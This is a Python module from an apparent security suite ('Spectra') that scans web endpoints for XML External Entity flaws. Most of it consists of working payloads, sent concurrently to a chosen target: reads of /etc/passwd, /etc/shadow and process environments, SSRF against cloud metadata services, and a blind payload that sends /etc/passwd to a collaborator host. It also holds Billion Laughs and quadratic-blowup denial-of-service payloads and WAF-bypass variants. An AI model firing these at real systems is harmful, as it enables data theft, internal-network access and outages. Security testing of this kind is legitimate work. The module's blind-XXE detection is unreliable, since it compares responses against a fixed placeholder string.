#!/usr/bin/env python3
"""
XXE (XML External Entity) Scanner - Spectra Security Suite
Detecta vulnerabilidades de XML External Entity em aplicações web.

Funcionalidades:
- Detecção automática de endpoints XML
- Múltiplos payloads XXE (file disclosure, SSRF, DoS)
- Suporte a diferentes parsers XML
- Detecção de blind XXE via OAST
- Threading paralelo otimizado
- Rate limiting adaptativo
- Análise de Content-Type
- Bypass de filtros WAF
"""

import asyncio
import aiohttp
import xml.etree.ElementTree as ET
from xml.dom import minidom
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs
from dataclasses import dataclass
from typing import List, Dict, Optional, Set, Tuple, Any
import base64
import hashlib
import json
from pathlib import Path

# Imports do Spectra
from ..core.logger import get_logger
from ..core import print_info, print_success, print_warning, print_error
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.console import Console
from rich.table import Table

console = Console()

@dataclass
class XXEResult:
    """Estrutura para resultado de XXE."""
    url: str
    method: str
    parameter: str
    payload_type: str
    payload: str
    response_content: str
    response_time: float
    status_code: int
    content_type: str
    vulnerability_type: str
    severity: str
    evidence: str
    recommendation: str
    blind_verification: bool = False
    oast_interaction: Optional[str] = None

class XXEPayloadGenerator:
    """Gerador de payloads XXE otimizado."""
    
    def __init__(self, collaborator_url: Optional[str] = None):
        self.collaborator_url = collaborator_url
        self.logger = get_logger(__name__)
        
    def get_file_disclosure_payloads(self) -> List[Dict[str, str]]:
        """Payloads para file disclosure."""
        payloads = []
        
        # Arquivos comuns para teste
        target_files = [
            '/etc/passwd', '/etc/hosts', '/etc/shadow',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\win.ini',
            '/proc/version', '/proc/self/environ',
            '/var/log/apache2/access.log',
            '/var/www/html/index.php',
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
        ]
        
        for file_path in target_files:
            # Payload básico
            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>'''
            
            payloads.append({
                'type': 'file_disclosure',
                'target': file_path,
                'payload': payload,
                'description': f'File disclosure: {file_path}'
            })
            
            # Payload com CDATA
            cdata_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root><![CDATA[&xxe;]]></root>'''
            
            payloads.append({
                'type': 'file_disclosure_cdata',
                'target': file_path,
                'payload': cdata_payload,
                'description': f'File disclosure with CDATA: {file_path}'
            })
        
        return payloads
    
    def get_ssrf_payloads(self) -> List[Dict[str, str]]:
        """Payloads para SSRF via XXE."""
        payloads = []
        
        # Targets internos comuns
        internal_targets = [
            'http://localhost:80',
            'http://127.0.0.1:80',
            'http://127.0.0.1:22',
            'http://127.0.0.1:3306',
            'http://127.0.0.1:5432',
            'http://127.0.0.1:6379',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP metadata
            'http://192.168.1.1',
            'http://10.0.0.1'
        ]
        
        for target in internal_targets:
            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{target}">
]>
<root>&xxe;</root>'''
            
            payloads.append({
                'type': 'ssrf',
                'target': target,
                'payload': payload,
                'description': f'SSRF to {target}'
            })
        
        return payloads
    
    def get_blind_xxe_payloads(self) -> List[Dict[str, str]]:
        """Payloads para Blind XXE."""
        payloads = []
        
        if not self.collaborator_url:
            return payloads
        
        # Blind XXE básico
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "{self.collaborator_url}/xxe-test">
%ext;
]>
<root>test</root>'''
        
        payloads.append({
            'type': 'blind_xxe',
            'target': self.collaborator_url,
            'payload': payload,
            'description': 'Blind XXE detection'
        })
        
        # Blind XXE com exfiltração
        exfil_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{self.collaborator_url}/?data=%file;'>">
%eval;
%exfil;
]>
<root>test</root>'''
        
        payloads.append({
            'type': 'blind_xxe_exfil',
            'target': self.collaborator_url,
            'payload': exfil_payload,
            'description': 'Blind XXE with data exfiltration'
        })
        
        return payloads
    
    def get_dos_payloads(self) -> List[Dict[str, str]]:
        """Payloads para DoS via XXE."""
        payloads = []
        
        # Billion Laughs Attack
        billion_laughs = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>'''
        
        payloads.append({
            'type': 'dos_billion_laughs',
            'target': 'memory_exhaustion',
            'payload': billion_laughs,
            'description': 'Billion Laughs DoS attack'
        })
        
        # Quadratic Blowup
        quadratic = '''<?xml version="1.0"?>
<!DOCTYPE kaboom [
<!ENTITY a "''' + 'A' * 50000 + '''">
]>
<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>'''
        
        payloads.append({
            'type': 'dos_quadratic',
            'target': 'memory_exhaustion',
            'payload': quadratic,
            'description': 'Quadratic blowup DoS attack'
        })
        
        return payloads
    
    def get_waf_bypass_payloads(self) -> List[Dict[str, str]]:
        """Payloads para bypass de WAF."""
        payloads = []
        
        # Encoding variations
        encoded_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;">
]>
<root>&xxe;</root>'''
        
        payloads.append({
            'type': 'waf_bypass_encoded',
            'target': '/etc/passwd',
            'payload': encoded_payload,
            'description': 'WAF bypass with HTML entities'
        })
        
        # Case variation
        case_payload = '''<?XML version="1.0" encoding="UTF-8"?>
<!doctype ROOT [
<!entity XXE system "file:///etc/passwd">
]>
<ROOT>&XXE;</ROOT>'''
        
        payloads.append({
            'type': 'waf_bypass_case',
            'target': '/etc/passwd',
            'payload': case_payload,
            'description': 'WAF bypass with case variation'
        })
        
        return payloads
    
    def get_all_payloads(self) -> List[Dict[str, str]]:
        """Retorna todos os payloads."""
        all_payloads = []
        all_payloads.extend(self.get_file_disclosure_payloads())
        all_payloads.extend(self.get_ssrf_payloads())
        all_payloads.extend(self.get_blind_xxe_payloads())
        all_payloads.extend(self.get_dos_payloads())
        all_payloads.extend(self.get_waf_bypass_payloads())
        return all_payloads

class XXEScanner:
    """Scanner principal para vulnerabilidades XXE."""
    
    def __init__(self, target_url: str, collaborator_url: Optional[str] = None,
                 max_workers: int = 10, timeout: int = 15, 
                 custom_payloads: Optional[str] = None):
        self.target_url = target_url.rstrip('/')
        self.collaborator_url = collaborator_url
        self.max_workers = max_workers
        self.timeout = timeout
        self.logger = get_logger(__name__)
        
        # Configurações
        self.session = None
        self.results = []
        self.tested_endpoints = set()
        self.xml_endpoints = []
        
        # Estatísticas
        self.stats = {
            'total_requests': 0,
            'xml_endpoints_found': 0,
            'vulnerabilities_found': 0,
            'file_disclosures': 0,
            'ssrf_findings': 0,
            'blind_xxe': 0,
            'dos_vulnerabilities': 0,
            'start_time': time.time(),
            'error_rate': 0.0
        }
        
        # Threading
        self.results_lock = threading.Lock()
        self.stats_lock = threading.Lock()
        
        # Payload generator
        self.payload_generator = XXEPayloadGenerator(collaborator_url)
        
        # Load custom payloads if provided
        self.custom_payloads = []
        if custom_payloads and Path(custom_payloads).exists():
            self._load_custom_payloads(custom_payloads)
    
    def _load_custom_payloads(self, file_path: str):
        """Carrega payloads customizados."""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        self.custom_payloads.append({
                            'type': 'custom',
                            'target': 'custom',
                            'payload': line,
                            'description': 'Custom payload'
                        })
        except Exception as e:
            self.logger.error(f"Erro ao carregar payloads customizados: {e}") 
   
    async def _create_session(self):
        """Cria sessão HTTP assíncrona."""
        connector = aiohttp.TCPConnector(
            limit=100,
            limit_per_host=20,
            ttl_dns_cache=300,
            use_dns_cache=True,
            ssl=False
        )
        
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        )
    
    async def _close_session(self):
        """Fecha sessão HTTP."""
        if self.session:
            await self.session.close()
    
    def _is_xml_endpoint(self, url: str, response_text: str, headers: Dict) -> bool:
        """Verifica se endpoint aceita/processa XML."""
        # Verifica Content-Type
        content_type = headers.get('content-type', '').lower()
        if any(xml_type in content_type for xml_type in ['xml', 'soap']):
            return True
        
        # Verifica se resposta contém XML
        if any(indicator in response_text.lower() for indicator in [
            '<?xml', '<soap:', '<wsdl:', 'xmlns:', '<rss', '<feed'
        ]):
            return True
        
        # Verifica se URL sugere XML
        if any(xml_indicator in url.lower() for xml_indicator in [
            'xml', 'soap', 'wsdl', 'rss', 'feed', 'api'
        ]):
            return True
        
        return False
    
    async def _discover_xml_endpoints(self) -> List[str]:
        """Descobre endpoints que processam XML."""
        endpoints = []
        
        # Endpoints comuns que podem processar XML
        common_paths = [
            '/api', '/api/v1', '/api/v2', '/soap', '/wsdl',
            '/xml', '/rss', '/feed', '/upload', '/import',
            '/export', '/webhook', '/callback', '/service',
            '/webservice', '/rest', '/graphql'
        ]
        
        # Adiciona endpoint base
        endpoints.append(self.target_url)
        
        # Testa paths comuns
        for path in common_paths:
            endpoints.append(urljoin(self.target_url, path))
        
        # Filtra endpoints válidos
        valid_endpoints = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            
            task = progress.add_task("[cyan]Descobrindo endpoints XML...", total=len(endpoints))
            
            for endpoint in endpoints:
                try:
                    async with self.session.get(endpoint) as response:
                        response_text = await response.text()
                        
                        if self._is_xml_endpoint(endpoint, response_text, dict(response.headers)):
                            valid_endpoints.append(endpoint)
                            with self.stats_lock:
                                self.stats['xml_endpoints_found'] += 1
                        
                        with self.stats_lock:
                            self.stats['total_requests'] += 1
                
                except Exception as e:
                    self.logger.debug(f"Erro ao testar endpoint {endpoint}: {e}")
                
                progress.update(task, advance=1)
        
        return valid_endpoints
    
    def _analyze_response(self, payload_info: Dict, response_text: str, 
                         status_code: int, response_time: float) -> Optional[XXEResult]:
        """Analisa resposta para detectar XXE."""
        vulnerability_detected = False
        evidence = ""
        severity = "Medium"
        vuln_type = payload_info['type']
        
        # Análise baseada no tipo de payload
        if payload_info['type'].startswith('file_disclosure'):
            # Procura por conteúdo de arquivos conhecidos
            file_indicators = {
                '/etc/passwd': ['root:', 'daemon:', 'bin:', 'sys:', 'nobody:'],
                '/etc/hosts': ['localhost', '127.0.0.1', 'broadcasthost'],
                '/etc/shadow': ['root:$', 'daemon:*', 'bin:*'],
                'win.ini': ['[fonts]', '[extensions]', '[mci extensions]'],
                '/proc/version': ['Linux version', 'gcc version'],
                '/proc/self/environ': ['PATH=', 'HOME=', 'USER=']
            }
            
            target_file = payload_info['target']
            for file_path, indicators in file_indicators.items():
                if file_path in target_file:
                    for indicator in indicators:
                        if indicator in response_text:
                            vulnerability_detected = True
                            evidence = f"File content detected: {indicator}"
                            severity = "High"
                            break
        
        elif payload_info['type'] == 'ssrf':
            # Procura por indicadores de SSRF
            ssrf_indicators = [
                'Connection refused', 'Connection timeout',
                'No route to host', 'Network is unreachable',
                'HTTP/1.1', 'HTTP/1.0', 'Server:', 'Content-Type:',
                'AWS', 'metadata', 'instance-id', 'ami-id'
            ]
            
            for indicator in ssrf_indicators:
                if indicator in response_text:
                    vulnerability_detected = True
                    evidence = f"SSRF indicator detected: {indicator}"
                    severity = "High"
                    break
        
        elif payload_info['type'].startswith('dos'):
            # Verifica timeout ou erro de servidor
            if response_time > 10 or status_code >= 500:
                vulnerability_detected = True
                evidence = f"DoS indicator: {response_time:.2f}s response time, status {status_code}"
                severity = "Medium"
        
        elif payload_info['type'].startswith('blind_xxe'):
            # Para blind XXE, precisaria verificar logs do collaborator
            # Por enquanto, verifica mudanças na resposta
            if len(response_text) != len("normal response"):
                vulnerability_detected = True
                evidence = "Response differs from baseline (potential blind XXE)"
                severity = "Medium"
        
        # Verifica erros XML que podem indicar processamento
        xml_errors = [
            'XML parsing error', 'External entity', 'DOCTYPE',
            'Entity not defined', 'Malformed XML', 'XML syntax error',
            'SAXParseException', 'XMLSyntaxError', 'DOMException'
        ]
        
        for error in xml_errors:
            if error in response_text:
                if not vulnerability_detected:
                    vulnerability_detected = True
                    evidence = f"XML processing detected: {error}"
                    severity = "Low"
                break
        
        if vulnerability_detected:
            return XXEResult(
                url=self.current_url,
                method=self.current_method,
                parameter=self.current_parameter,
                payload_type=payload_info['type'],
                payload=payload_info['payload'],
                response_content=response_text[:1000],  # Limita tamanho
                response_time=response_time,
                status_code=status_code,
                content_type=self.current_content_type,
                vulnerability_type=vuln_type,
                severity=severity,
                evidence=evidence,
                recommendation=self._get_recommendation(vuln_type)
            )
        
        return None
    
    def _get_recommendation(self, vuln_type: str) -> str:
        """Retorna recomendação baseada no tipo de vulnerabilidade."""
        recommendations = {
            'file_disclosure': 'Desabilite external entities no parser XML. Use bibliotecas seguras como defusedxml.',
            'ssrf': 'Implemente whitelist de URLs permitidas. Desabilite external entities.',
            'dos_billion_laughs': 'Configure limites de expansão de entidades no parser XML.',
            'dos_quadratic': 'Implemente limites de tamanho para documentos XML.',
            'blind_xxe': 'Desabilite completamente external entities e DTD processing.',
            'waf_bypass_encoded': 'Implemente validação rigorosa de entrada XML.',
            'waf_bypass_case': 'Use parser XML que normalize case sensitivity.'
        }
        
        return recommendations.get(vuln_type, 'Desabilite external entities e implemente validação segura de XML.')
    
    async def _test_endpoint_with_payload(self, endpoint: str, payload_info: Dict) -> Optional[XXEResult]:
        """Testa endpoint específico com payload XXE."""
        try:
            # Configura headers para XML
            headers = {
                'Content-Type': 'application/xml',
                'Accept': 'application/xml, text/xml, */*'
            }
            
            start_time = time.time()
            
            # Testa POST com XML
            async with self.session.post(
                endpoint, 
                data=payload_info['payload'],
                headers=headers
            ) as response:
                response_text = await response.text()
                response_time = time.time() - start_time
                
                # Configura contexto para análise
                self.current_url = endpoint
                self.current_method = 'POST'
                self.current_parameter = 'xml_body'
                self.current_content_type = response.headers.get('content-type', '')
                
                result = self._analyze_response(
                    payload_info, response_text, 
                    response.status, response_time
                )
                
                with self.stats_lock:
                    self.stats['total_requests'] += 1
                
                return result
        
        except Exception as e:
            self.logger.debug(f"Erro ao testar {endpoint} com payload {payload_info['type']}: {e}")
            return None
    
    async def _run_xxe_tests(self, endpoints: List[str]) -> List[XXEResult]:
        """Executa testes XXE em paralelo."""
        results = []
        payloads = self.payload_generator.get_all_payloads()
        
        # Adiciona payloads customizados
        if self.custom_payloads:
            payloads.extend(self.custom_payloads)
        
        total_tests = len(endpoints) * len(payloads)
        
        # Buffer para acumular descobertas
        vulnerabilities_found = []
        
        print_info(f"[yellow]Iniciando testes XXE em {len(endpoints)} endpoints com {len(payloads)} payloads...[/yellow]")
        print("")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
            transient=True  # Remove a barra quando concluída
        ) as progress:
            
            task = progress.add_task("[red]Testando XXE vulnerabilities...", total=total_tests)
            
            # Cria tasks para execução paralela
            tasks = []
            for endpoint in endpoints:
                for payload_info in payloads:
                    tasks.append(self._test_endpoint_with_payload(endpoint, payload_info))
            
            # Executa em batches para controlar concorrência
            batch_size = self.max_workers
            for i in range(0, len(tasks), batch_size):
                batch = tasks[i:i + batch_size]
                batch_results = await asyncio.gather(*batch, return_exceptions=True)
                
                # Processa resultados do batch
                batch_vulnerabilities = []
                for result in batch_results:
                    if isinstance(result, XXEResult):
                        results.append(result)
                        batch_vulnerabilities.append(result)
                        with self.stats_lock:
                            self.stats['vulnerabilities_found'] += 1
                            
                            # Atualiza estatísticas específicas
                            if 'file_disclosure' in result.payload_type:
                                self.stats['file_disclosures'] += 1
                            elif result.payload_type == 'ssrf':
                                self.stats['ssrf_findings'] += 1
                            elif 'blind_xxe' in result.payload_type:
                                self.stats['blind_xxe'] += 1
                            elif 'dos' in result.payload_type:
                                self.stats['dos_vulnerabilities'] += 1
                
                # Atualiza progresso
                progress.update(task, advance=len(batch))
                
                # Acumula vulnerabilidades encontradas
                vulnerabilities_found.extend(batch_vulnerabilities)
        
        # Após o progresso, exibe as descobertas de forma organizada
        if vulnerabilities_found:
            print("")
            print_success(f"[bold green]Descobertas durante o scan:[/bold green]")
            
            # Agrupa por endpoint para melhor visualização
            endpoints_vulns = {}
            for vuln in vulnerabilities_found:
                if vuln.url not in endpoints_vulns:
                    endpoints_vulns[vuln.url] = []
                endpoints_vulns[vuln.url].append(vuln)
            
            # Exibe vulnerabilidades agrupadas por endpoint com detalhes
            for endpoint, vulns in endpoints_vulns.items():
                print_info(f"\n[bold cyan]🎯 {endpoint}[/bold cyan]")
                
                # Agrupa por tipo de vulnerabilidade para mostrar detalhes
                vuln_types = {}
                for vuln in vulns:
                    if vuln.vulnerability_type not in vuln_types:
                        vuln_types[vuln.vulnerability_type] = []
                    vuln_types[vuln.vulnerability_type].append(vuln)
                
                for vuln_type, vuln_list in vuln_types.items():
                    severity_color = "red" if any(v.severity == "High" for v in vuln_list) else "yellow"
                    print_error(f"  🔍 [bold {severity_color}]{vuln_type.upper()}[/bold {severity_color}] ({len(vuln_list)} encontrada(s))")
                    
                    # Mostra detalhes específicos por tipo de vulnerabilidade
                    if vuln_type.startswith('file_disclosure'):
                        self._show_file_disclosure_details(vuln_list)
                    elif vuln_type == 'ssrf':
                        self._show_ssrf_details(vuln_list)
                    elif vuln_type.startswith('dos_'):
                        self._show_dos_details(vuln_list)
                    elif vuln_type.startswith('waf_bypass'):
                        self._show_waf_bypass_details(vuln_list)
                    else:
                        self._show_generic_details(vuln_list)
                    
                    print("")
        
        # Exibe resumo final
        if results:
            print_success(f"[bold green]Scan concluído: {len(results)} vulnerabilidades XXE encontradas[/bold green]")
        else:
            print_info("[bold blue]Scan concluído: Nenhuma vulnerabilidade XXE encontrada[/bold blue]")
        
        return results
    
    def _show_file_disclosure_details(self, vuln_list: List[XXEResult]):
        """Mostra detalhes específicos para vulnerabilidades de file disclosure."""
        # Agrupa por arquivo alvo
        files_tested = {}
        for vuln in vuln_list:
            # Extrai o arquivo alvo do payload
            payload_lines = vuln.payload.split('\n')
            target_file = "unknown"
            for line in payload_lines:
                if 'SYSTEM "file://' in line:
                    start = line.find('file://') + 7
                    end = line.find('"', start)
                    if end > start:
                        target_file = line[start:end]
                        break
            
            if target_file not in files_tested:
                files_tested[target_file] = []
            files_tested[target_file].append(vuln)
        
        for target_file, vulns in files_tested.items():
            severity = "High" if any(v.severity == "High" for v in vulns) else "Low"
            color = "red" if severity == "High" else "yellow"
            print_info(f"    📄 [bold {color}]{target_file}[/bold {color}] - {len(vulns)} tentativa(s)")
            
            # Mostra evidências encontradas
            for vuln in vulns[:2]:  # Limita a 2 exemplos
                if "File content detected:" in vuln.evidence:
                    evidence = vuln.evidence.replace("File content detected: ", "")
                    print_success(f"      ✓ Conteúdo detectado: [green]{evidence}[/green]")
                    print_info(f"      ⏱️  Tempo de resposta: {vuln.response_time:.2f}s")
                    print_info(f"      📊 Status: {vuln.status_code}")
                elif "XML processing detected:" in vuln.evidence:
                    print_warning(f"      ⚠️  Parser XML processou o payload (possível vulnerabilidade)")
                    print_info(f"      📊 Status: {vuln.status_code} | Tempo: {vuln.response_time:.2f}s")
    
    def _show_ssrf_details(self, vuln_list: List[XXEResult]):
        """Mostra detalhes específicos para vulnerabilidades SSRF."""
        # Agrupa por target interno
        targets_tested = {}
        for vuln in vuln_list:
            # Extrai o target do payload
            payload_lines = vuln.payload.split('\n')
            target = "unknown"
            for line in payload_lines:
                if 'SYSTEM "http' in line:
                    start = line.find('http')
                    end = line.find('"', start)
                    if end > start:
                        target = line[start:end]
                        break
            
            if target not in targets_tested:
                targets_tested[target] = []
            targets_tested[target].append(vuln)
        
        for target, vulns in targets_tested.items():
            severity = "High" if any(v.severity == "High" for v in vulns) else "Low"
            color = "red" if severity == "High" else "yellow"
            print_info(f"    🌐 [bold {color}]{target}[/bold {color}] - {len(vulns)} tentativa(s)")
            
            # Mostra evidências encontradas
            for vuln in vulns[:1]:  # Mostra apenas 1 exemplo por target
                if "SSRF indicator detected:" in vuln.evidence:
                    indicator = vuln.evidence.replace("SSRF indicator detected: ", "")
                    print_success(f"      ✓ Indicador SSRF: [green]{indicator}[/green]")
                    print_info(f"      ⏱️  Tempo de resposta: {vuln.response_time:.2f}s")
                    print_info(f"      📊 Status: {vuln.status_code}")
                elif "XML processing detected:" in vuln.evidence:
                    print_warning(f"      ⚠️  Requisição processada pelo parser XML")
                    print_info(f"      📊 Status: {vuln.status_code} | Tempo: {vuln.response_time:.2f}s")
    
    def _show_dos_details(self, vuln_list: List[XXEResult]):
        """Mostra detalhes específicos para vulnerabilidades DoS."""
        for vuln in vuln_list:
            attack_type = "Billion Laughs" if "billion_laughs" in vuln.payload_type else "Quadratic Blowup"
            print_info(f"    💥 [bold red]{attack_type} Attack[/bold red]")
            
            if "DoS indicator:" in vuln.evidence:
                print_success(f"      ✓ [green]{vuln.evidence}[/green]")
            else:
                print_warning(f"      ⚠️  Parser processou payload DoS")
                print_info(f"      ⏱️  Tempo de resposta: {vuln.response_time:.2f}s")
                print_info(f"      📊 Status: {vuln.status_code}")
            
            # Mostra parte do payload para referência
            payload_preview = vuln.payload.split('\n')[0:3]
            print_info(f"      📝 Payload: {' '.join(payload_preview)[:60]}...")
    
    def _show_waf_bypass_details(self, vuln_list: List[XXEResult]):
        """Mostra detalhes específicos para técnicas de bypass de WAF."""
        for vuln in vuln_list:
            bypass_type = "HTML Entity Encoding" if "encoded" in vuln.payload_type else "Case Variation"
            print_info(f"    🛡️  [bold yellow]WAF Bypass - {bypass_type}[/bold yellow]")
            
            print_warning(f"      ⚠️  Técnica de bypass funcionou")
            print_info(f"      ⏱️  Tempo de resposta: {vuln.response_time:.2f}s")
            print_info(f"      📊 Status: {vuln.status_code}")
            
            # Mostra exemplo da técnica usada
            if "encoded" in vuln.payload_type:
                print_info(f"      🔧 Técnica: HTML entities (&#102;&#105;&#108;&#101; = file)")
            else:
                print_info(f"      🔧 Técnica: Case variation (<?XML, <!doctype, <!entity>)")
    
    def _show_generic_details(self, vuln_list: List[XXEResult]):
        """Mostra detalhes genéricos para outros tipos de vulnerabilidades."""
        for vuln in vuln_list[:2]:  # Limita a 2 exemplos
            print_info(f"    🔍 [bold yellow]{vuln.vulnerability_type}[/bold yellow]")
            print_warning(f"      ⚠️  {vuln.evidence}")
            print_info(f"      ⏱️  Tempo: {vuln.response_time:.2f}s | Status: {vuln.status_code}")
    
    async def scan(self) -> List[XXEResult]:
        """Executa scan completo de XXE."""
        print_info("[bold red]SPECTRA XXE SCANNER[/bold red]")
        print_info(f"Target: {self.target_url}")
        print_info(f"Collaborator: {self.collaborator_url or 'Não configurado'}")
        print("")
        
        await self._create_session()
        
        try:
            # Descobre endpoints XML
            xml_endpoints = await self._discover_xml_endpoints()
            
            if not xml_endpoints:
                print_warning("Nenhum endpoint XML encontrado")
                return []
            
            print_success(f"Encontrados {len(xml_endpoints)} endpoints XML")
            
            # Executa testes XXE
            results = await self._run_xxe_tests(xml_endpoints)
            
            # Exibe resultados
            self._display_results(results)
            
            return results
        
        finally:
            await self._close_session()
    
    def _display_results(self, results: List[XXEResult]):
        """Exibe resultados do scan."""
        print("")
        print_info("[bold green]RESULTADOS DO SCAN XXE[/bold green]")
        
        if not results:
            print_info("Nenhuma vulnerabilidade XXE encontrada")
            return
        
        # Tabela de vulnerabilidades
        table = Table(title="Vulnerabilidades XXE Encontradas")
        table.add_column("URL", style="cyan")
        table.add_column("Tipo", style="red")
        table.add_column("Severidade", style="yellow")
        table.add_column("Evidência", style="green")
        
        for result in results:
            table.add_row(
                result.url,
                result.vulnerability_type,
                result.severity,
                result.evidence[:50] + "..." if len(result.evidence) > 50 else result.evidence
            )
        
        console.print(table)
        
        # Estatísticas
        print("")
        print_info("[bold blue]ESTATÍSTICAS[/bold blue]")
        stats_table = Table()
        stats_table.add_column("Métrica", style="cyan")
        stats_table.add_column("Valor", style="green")
        
        scan_time = time.time() - self.stats['start_time']
        
        stats_data = [
            ("Total de Requests", str(self.stats['total_requests'])),
            ("Endpoints XML", str(self.stats['xml_endpoints_found'])),
            ("Vulnerabilidades", str(self.stats['vulnerabilities_found'])),
            ("File Disclosures", str(self.stats['file_disclosures'])),
            ("SSRF Findings", str(self.stats['ssrf_findings'])),
            ("Blind XXE", str(self.stats['blind_xxe'])),
            ("DoS Vulnerabilities", str(self.stats['dos_vulnerabilities'])),
            ("Tempo de Scan", f"{scan_time:.2f}s"),
            ("Requests/seg", f"{self.stats['total_requests']/scan_time:.2f}")
        ]
        
        for metric, value in stats_data:
            stats_table.add_row(metric, value)
        
        console.print(stats_table)
    
    def export_results(self, results: List[XXEResult], format_type: str = 'json') -> str:
        """Exporta resultados em diferentes formatos."""
        if format_type == 'json':
            return self._export_json(results)
        elif format_type == 'xml':
            return self._export_xml(results)
        elif format_type == 'csv':
            return self._export_csv(results)
        else:
            raise ValueError(f"Formato não suportado: {format_type}")
    
    def _export_json(self, results: List[XXEResult]) -> str:
        """Exporta para JSON."""
        export_data = {
            'scan_info': {
                'target': self.target_url,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'scanner': 'Spectra XXE Scanner',
                'version': '1.0'
            },
            'statistics': self.stats,
            'vulnerabilities': []
        }
        
        for result in results:
            export_data['vulnerabilities'].append({
                'url': result.url,
                'method': result.method,
                'parameter': result.parameter,
                'payload_type': result.payload_type,
                'vulnerability_type': result.vulnerability_type,
                'severity': result.severity,
                'evidence': result.evidence,
                'recommendation': result.recommendation,
                'response_time': result.response_time,
                'status_code': result.status_code
            })
        
        return json.dumps(export_data, indent=2, ensure_ascii=False)
    
    def _export_xml(self, results: List[XXEResult]) -> str:
        """Exporta para XML."""
        root = ET.Element('xxe_scan_results')
        
        # Scan info
        scan_info = ET.SubElement(root, 'scan_info')
        ET.SubElement(scan_info, 'target').text = self.target_url
        ET.SubElement(scan_info, 'timestamp').text = time.strftime('%Y-%m-%d %H:%M:%S')
        
        # Statistics
        stats_elem = ET.SubElement(root, 'statistics')
        for key, value in self.stats.items():
            ET.SubElement(stats_elem, key).text = str(value)
        
        # Vulnerabilities
        vulns_elem = ET.SubElement(root, 'vulnerabilities')
        for result in results:
            vuln_elem = ET.SubElement(vulns_elem, 'vulnerability')
            ET.SubElement(vuln_elem, 'url').text = result.url
            ET.SubElement(vuln_elem, 'type').text = result.vulnerability_type
            ET.SubElement(vuln_elem, 'severity').text = result.severity
            ET.SubElement(vuln_elem, 'evidence').text = result.evidence
        
        return ET.tostring(root, encoding='unicode')
    
    def _export_csv(self, results: List[XXEResult]) -> str:
        """Exporta para CSV."""
        import csv
        import io
        
        output = io.StringIO()
        writer = csv.writer(output)
        
        # Header
        writer.writerow([
            'URL', 'Method', 'Parameter', 'Payload Type', 
            'Vulnerability Type', 'Severity', 'Evidence', 
            'Response Time', 'Status Code'
        ])
        
        # Data
        for result in results:
            writer.writerow([
                result.url, result.method, result.parameter,
                result.payload_type, result.vulnerability_type,
                result.severity, result.evidence,
                result.response_time, result.status_code
            ])
        
        return output.getvalue()

# Função de conveniência para uso direto
async def xxe_scan(url: str, collaborator_url: Optional[str] = None,
                   max_workers: int = 10, timeout: int = 15,
                   custom_payloads: Optional[str] = None,
                   return_findings: bool = False) -> Optional[List[XXEResult]]:
    """
    Executa scan de XXE em uma URL.
    
    Args:
        url: URL alvo
        collaborator_url: URL do servidor OAST para blind XXE
        max_workers: Número máximo de workers paralelos
        timeout: Timeout para requests
        custom_payloads: Arquivo com payloads customizados
        return_findings: Se True, retorna lista de vulnerabilidades
    
    Returns:
        Lista de vulnerabilidades se return_findings=True
    """
    scanner = XXEScanner(
        target_url=url,
        collaborator_url=collaborator_url,
        max_workers=max_workers,
        timeout=timeout,
        custom_payloads=custom_payloads
    )
    
    results = await scanner.scan()
    
    if return_findings:
        return results
    
    return None

def xxe_scan_sync(url: str, **kwargs) -> Optional[List[XXEResult]]:
    """Versão síncrona do scanner XXE."""
    return asyncio.run(xxe_scan(url, **kwargs))